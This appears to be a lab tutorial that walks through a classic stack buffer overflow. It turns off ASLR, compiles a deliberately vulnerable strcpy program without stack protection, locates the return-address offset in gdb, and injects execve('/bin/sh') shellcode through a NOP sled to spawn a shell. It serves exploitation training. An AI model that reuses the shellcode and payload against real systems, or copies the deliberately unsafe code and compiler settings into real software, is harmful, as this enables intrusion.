# &#35; basic stack buffer overflow

#### &#42; setting aslr off & core dump
```bash

$ cat /etc/sysctl.conf
kernel.randomize_va_space=0
kernel.core_pattern = core.%e


$ sudo sysctl -p
kernel.randomize_va_space = 0
kernel.core_pattern = core.%e

```

#### &#42; vulnerable source code
#### strcpy() in vuln_func() : can overwrite rsp & rip ...
```bash

$ cat vulnerable.c
#include <stdio.h>

void vuln_func(char *input) {
	char buffer[256];
	strcpy(buffer, input);
	printf("%s\n", buffer);
}

int main(int argc, char *argv[]) {
	if(argc>1)
		vuln_func(argv[1]);
	else
		printf("Usage : %s %s\n", argv[0], "input string");
}

# Canary/SSP & NX off because of first exploit
$ gcc -fno-stack-protector -z execstack vulnerable.c -o vulnerable

```


#### &#42; compile & try to overflow
```bash
$ pwn cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

$ pwn cyclic 300 > payload
$ cat payload
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

$ ./vulnerable $(cat payload)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
segmentation fault (core dumped)

$ ls core.vulnerable
core.vulnerable
```


#### &#42; analysis using gdb(gef)
```bash
$ gdb -c core.vulnerable -q
[!] './vulnerable aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqa' not found/readable
[!] Failed to get file debug information, most of gef features will not work
Core was generated by `./vulnerable aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqa'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00005555555551c9 in ?? ()
gef???  x/32xg $rsp-300
0x7fffffffe14c:	0x0000000000007fff	0x555551c700000000
0x7fffffffe15c:	0x0000000000005555	0xffffe5f500000000
0x7fffffffe16c:	0x6161616100007fff	0x6161616361616162
0x7fffffffe17c:	0x6161616561616164	0x6161616761616166
0x7fffffffe18c:	0x6161616961616168	0x6161616b6161616a
0x7fffffffe19c:	0x6161616d6161616c	0x6161616f6161616e
0x7fffffffe1ac:	0x6161617161616170	0x6161617361616172
0x7fffffffe1bc:	0x6161617561616174	0x6161617761616176
0x7fffffffe1cc:	0x6161617961616178	0x626161626261617a
0x7fffffffe1dc:	0x6261616462616163	0x6261616662616165
0x7fffffffe1ec:	0x6261616862616167	0x6261616a62616169
0x7fffffffe1fc:	0x6261616c6261616b	0x6261616e6261616d
0x7fffffffe20c:	0x626161706261616f	0x6261617262616171
0x7fffffffe21c:	0x6261617462616173	0x6261617662616175
0x7fffffffe22c:	0x6261617862616177	0x6361617a62616179
0x7fffffffe23c:	0x6361616363616162	0x6361616563616164
gef???

# 0x7fffffffe19c is nops address (memory address gap), not 0x7fffffffe1a0


# pattern payload exists in rbp
# and rip is fault address
gef???  info reg
rax            0x12d               0x12d
rbx            0x555555555230      0x555555555230
rcx            0x7ffff7ed01e7      0x7ffff7ed01e7
rdx            0x0                 0x0
rsi            0x5555555592a0      0x5555555592a0
rdi            0x7ffff7fad4c0      0x7ffff7fad4c0
rbp            0x636161706361616f  0x636161706361616f
rsp            0x7fffffffe278      0x7fffffffe278
r8             0x12d               0x12d
r9             0x7c                0x7c
r10            0x7ffff7faabe0      0x7ffff7faabe0
r11            0x246               0x246
r12            0x5555555550a0      0x5555555550a0
r13            0x7fffffffe380      0x7fffffffe380
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x5555555551c9      0x5555555551c9
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
gef???

```



#### &#42; find exactly offset count
```bash
# find out 256 bytes
$ pwn cyclic -l 0x63616170
252
$ pwn cyclic -l 0x6361616f
256

```

#### &#42; make shellcode
#### link : <https://github.com/pwn4all/pwn/blob/master/make-shellcode.md/>
```bash
$ cat shell.s
global _start
section .text
_start:
  xor rsi,rsi			; rsi = 0
  push rsi			; push null(0x0) on stack
  mov rdi,0x68732f2f6e69622f
  push rdi			; push /bin/sh on stack
  push rsp			; push &/bin/sh\0
  pop rdi			; rdi = &/bin/sh\0
  push 59			; call sys_execve
  pop rax			; rax = 0
  cdq
  syscall

shell$ nasm -f elf64 shell.s -o shell.o
shell$ ld shell.o -o shell
shell$ ./shell
$ exit

shell$ echo "\"$(objdump -d ./shell | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

#### &#42; assemble payload
#### buf[256] + rbp[8] + ret/rip[8]
#### => nops[177] + shellcode[23] + nops[56] + dummy[8] + addr_shellcode
```bash
python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"B"*8+"C"*6' > payload

```

#### &#42; find target memory address
```bash
$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"B"*8+"C"*6' > payload

$ gdb ./vulnerable -q
gef???  b *vuln_func
Breakpoint 1 at 0x1189
gef???  r $(cat payload)
gef???  continue
.
# overwrite payload on rip and rsp
.
$rsp   : 0x00007fffffffe250  ???  0x00007fffffffe358  ???  0x00007fffffffe5c3  ???  "/home/user/simple_bof/vulnerable"
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x00005555555592a0  ???  0x9090909090909090
$rdi   : 0x00007ffff7fad4c0  ???  0x0000000000000000
$rip   : 0x434343434343
.
.

gef???  b *vuln_func+42  => strcpy() 
gef???  r $(cat payload)
gef???  continue
gef???  x/56x $rsp
0x7fffffffe130:	0x00000000	0x00000000	0xffffe5e4	0x00007fff
0x7fffffffe140:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe150:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe160:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe170:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe180:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe190:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1d0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1e0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1f0:	0xf6314890	0x2fbf4856	0x2f6e6962	0x5768732f
0x7fffffffe200:	0x3b6a5f54	0x050f9958	0x90909090	0x90909090
gef???

# find nops address(0x7fffffffe190) for shellcode

```


#### &#42; try to exploit
#### if you failed exploit > use core debugging > need to exactly find nops address for shellcode
```bash
$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"BBBBBBBB"+"\x90\xe1\xff\xff\xff\x7f"' > payload
user@pwn:~/simple_bof$ ./vulnerable $(cat payload)
???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????H1???VH???/bin//shWT_j;X???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????BBBBBBBB???????????????
$
```

